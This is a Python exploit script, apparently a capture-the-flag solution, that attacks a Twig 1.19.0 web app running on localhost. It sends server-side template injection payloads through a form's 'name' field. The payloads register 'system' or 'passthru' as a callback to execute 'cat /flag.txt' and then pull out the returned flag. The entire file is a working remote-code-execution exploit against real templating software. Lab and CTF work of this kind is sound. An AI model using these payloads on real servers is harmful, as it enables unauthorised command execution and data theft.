#!/usr/bin/env python3
import sys
import re
import os
import argparse
import urllib.request
import urllib.parse


def post_name(url: str, name_value: str, timeout: int = 10) -> str:
    data = urllib.parse.urlencode({"name": name_value}).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.read().decode("utf-8", errors="replace")


def extract_flag(text: str):
    m = re.search(r"FLAG\{[^}]+\}", text)
    return m.group(0) if m else None


def try_exploit(url: str) -> str:
    # Twig 1.19.0 string loader SSTI: leverage undefined function callback side-effect
    payloads = [
        "{{ _self.env.registerUndefinedFunctionCallback('system') }}{{ _self.env.getFunction('cat /flag.txt') }}",
        "{{ _self.env.registerUndefinedFunctionCallback('passthru') }}{{ _self.env.getFunction('cat /flag.txt') }}",
    ]
    for p in payloads:
        try:
            body = post_name(url, p)
        except Exception:
            continue
        flag = extract_flag(body)
        if flag:
            return flag
    return None


def main():
    parser = argparse.ArgumentParser(description="X-044-24 local SSTI exp: print flag")
    parser.add_argument(
        "--url",
        help="Target URL (default tries 127.0.0.1:8080/index.php then /)",
    )
    args = parser.parse_args()

    candidates = []
    if args.url:
        candidates.append(args.url)
    else:
        # default local targets
        candidates.extend(
            [
                "http://127.0.0.1:8080/index.php",
                "http://127.0.0.1:8080/",
                "http://localhost:8080/index.php",
                "http://localhost:8080/",
            ]
        )

    for u in candidates:
        flag = try_exploit(u)
        if flag:
            print(flag)
            return 0

    print("No flag found (is the container running on :8080?)", file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())

